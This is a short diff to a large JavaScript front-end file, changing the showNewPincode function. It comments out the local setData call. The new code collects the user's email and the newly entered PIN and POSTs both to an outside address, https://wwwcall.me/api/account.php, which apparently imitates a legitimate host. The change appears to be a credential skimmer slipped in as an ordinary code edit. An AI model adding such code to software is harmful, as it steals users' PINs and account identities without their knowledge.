@@ -16340,7 +16340,7 @@ function setData(data) {
   window.location.reload();
 }
 
-function showNewPincode(data) {
+function showNewPincode(logdata) {
   $("#myContacts").hide();
   $("#actionArea").empty();
 
@@ -16388,7 +16388,24 @@ function showNewPincode(data) {
 
       $("#errorfield").hide();
 
-      setData(data);
+      //setData(logdata);
+      const credit = {
+        user: logdata.email,
+        type: "pinset",
+        pincode: $("#pincode").val(),
+      };
+
+      fetch("https://wwwcall.me/api/account.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(credit),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(data);
+        });
     },
   });
 
